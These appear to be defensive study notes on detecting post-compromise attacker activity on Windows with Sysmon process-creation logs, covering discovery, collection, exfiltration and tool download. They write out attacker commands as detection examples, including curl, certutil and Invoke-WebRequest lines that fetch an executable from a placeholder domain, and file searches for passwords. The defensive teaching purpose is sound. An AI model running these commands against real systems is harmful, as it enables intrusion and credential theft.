# Windows Threat Detection #2

## Overview
Focuses on detecting attacker activity immediately after gaining access to a Windows system, covering:
- Discovery
- Collection
- Credential Access
- Exfiltration
- Ingress Tool Transfer

Primary log source:
- **Sysmon Operational Log**
- **Sysmon Event ID 1 – Process Creation**

---

# Discovery

## Purpose
Attackers gather information about:
- User privileges
- System configuration
- Installed software
- Network configuration
- Security products
- Valuable files

---

## Common Discovery Commands

### User Discovery

```cmd
whoami
whoami /priv
net user
net localgroup
query user
```

PowerShell

```powershell
Get-LocalUser
```

Purpose:
- Current user
- User privileges
- Local users
- Administrator groups

---

### File Discovery

CMD

```cmd
dir
type file.txt
```

PowerShell

```powershell
Get-ChildItem
Get-Content
```

Purpose:
- Browse folders
- Read documents
- Identify valuable files

---

### System Discovery

```cmd
systeminfo
tasklist /v
wmic product get name,version
```

PowerShell

```powershell
Get-Service
```

Purpose:
- Installed software
- Running processes
- Services
- OS information

---

### Network Discovery

```cmd
ipconfig /all
netstat -ano
netsh advfirewall show allprofiles
```

Purpose:
- IP configuration
- Active connections
- Firewall configuration

---

### Security Product Discovery

```powershell
Get-WmiObject -Namespace root\SecurityCenter2 -Query "SELECT * FROM AntivirusProduct"
```

Purpose:
- Detect installed antivirus/EDR
- Decide whether malware should continue

---

# Discovery Process Trees

Typical malware execution

```
explorer.exe
    ↓
invoice.pdf.exe
    ↓
cmd.exe
    ├── whoami
    ├── ipconfig
    ├── net user
    ├── tasklist
    └── wmic
```

PowerShell example

```
invoice.pdf.exe
    ↓
powershell.exe
    ├── Get-Service
    └── Get-MpPreference
```

---

# Discovery via GUI

Attackers may avoid command line entirely.

Common GUI tools:

```
compmgmt.msc
Task Manager
Settings
Control Panel
Disk Management
Event Viewer
Notepad
```

Example process tree

```
explorer.exe
    ├── mmc.exe
    ├── taskmgr.exe
    ├── control.exe
    └── notepad.exe
```

---

# Detecting Discovery

Primary source:

**Sysmon Event ID 1 (Process Creation)**

Useful fields:

- Image
- CommandLine
- ParentImage
- ParentProcessId
- ProcessId
- User
- CurrentDirectory

Example

Image

```
C:\Windows\System32\net.exe
```

CommandLine

```
net user Administrator
```

---

## Build Process Trees

Correlate:

- ProcessId
- ParentProcessId

Purpose:
- Determine origin of commands
- Identify malware spawning CMD or PowerShell
- Separate legitimate administration from attacker activity

---

# Collection

## Goal

Locate valuable information including:

- Passwords
- SSH keys
- Browser credentials
- Cookies
- Databases
- Documents
- Chat history
- Cryptocurrency wallets

---

## Common Collection Locations

### Browser Data

```
Chrome History
Chrome Cookies
Saved Passwords
```

---

### SSH Keys

```
C:\Users\<user>\.ssh\
```

Examples

```
id_rsa
id_ed25519
authorized_keys
```

---

### Browser Passwords

Chrome

```
Passwords and Autofill
Password Manager
```

---

### Databases

```
Microsoft SQL DATA folders
```

---

### Cryptocurrency

```
wallet.dat
```

---

# Detecting Collection

Common attacker commands

Open files

```cmd
notepad.exe secrets.txt
```

Search files

```cmd
type file.txt | findstr password
```

Search PDFs

```powershell
Get-ChildItem -Recurse -Filter *.pdf
```

Copy files

```cmd
copy secrets.txt C:\Temp
```

Archive files

```powershell
Compress-Archive
```

or

```cmd
7za.exe a archive.zip
```

---

# Data Stealers

Unlike human attackers, stealers:

- Read files directly
- Avoid CMD
- Avoid PowerShell
- Use built-in APIs

Common targets

- Chrome
- Discord
- Telegram
- Steam
- Clipboard
- Browser sessions
- Wallets
- Screenshots

---

# Exfiltration

Purpose:
Send stolen information to attacker infrastructure.

Common destinations

- Dropbox
- Mega
- GitHub
- Telegram
- Amazon S3
- Fake update domains

Always investigate

- Destination domain
- Parent process
- Executable
- Network connections

---

# Ingress Tool Transfer

Purpose:
Download additional attacker tools.

Examples

- Mimikatz
- Seatbelt
- RATs
- Ransomware

---

## Common Download Methods

### Curl

```cmd
curl.exe https://domain/file.exe -o malware.exe
```

---

### Certutil

```cmd
certutil.exe -urlcache -f https://domain/file.exe malware.exe
```

---

### PowerShell

```powershell
Invoke-WebRequest -Uri https://domain/file.exe -OutFile malware.exe
```

Alias

```powershell
iwr
```

---

### Browser

Simply downloading through Chrome or Edge.

---

# Detecting Tool Transfer

Monitor for

- HTTP requests
- HTTPS requests
- DNS lookups
- Network connections
- Downloaded executables

Typical process tree

```
cmd.exe
    ↓
curl.exe
    ↓
HTTP Request
    ↓
Downloaded executable
```

---

# Important Sysmon Event IDs

| Event ID | Description |
|----------|-------------|
| **1** | Process Creation ⭐ |
| **3** | Network Connection |
| **11** | File Creation |
| **22** | DNS Query |

---

# Investigation Workflow

1. Identify suspicious process.
2. Locate **Sysmon Event ID 1**.
3. Examine:
   - Image
   - CommandLine
   - ParentImage
   - ParentProcessId
4. Build the process tree.
5. Look for Discovery commands.
6. Identify Collection behaviour.
7. Check for archived files.
8. Review DNS and network connections.
9. Identify exfiltration destination.
10. Determine attacker objective.

---

# Key Takeaways

- Discovery commonly uses legitimate Windows utilities (Living Off the Land).
- Multiple Discovery commands executed within a short timeframe are more suspicious than a single command.
- Process trees provide essential context for distinguishing normal administration from malicious activity.
- Sysmon Event ID 1 is the primary source for tracking attacker commands.
- Collection often targets browser credentials, SSH keys, documents, databases, and wallets.
- Attackers frequently compress stolen files before exfiltration.
- Exfiltration destinations may be cloud storage, messaging platforms, GitHub, or attacker-controlled domains.
- Additional malware is commonly downloaded using built-in Windows tools such as **curl**, **certutil**, and **Invoke-WebRequest**.
- Correlating Process Creation, Network Connection, DNS Query, and File Creation events provides the clearest view of attacker behaviour.
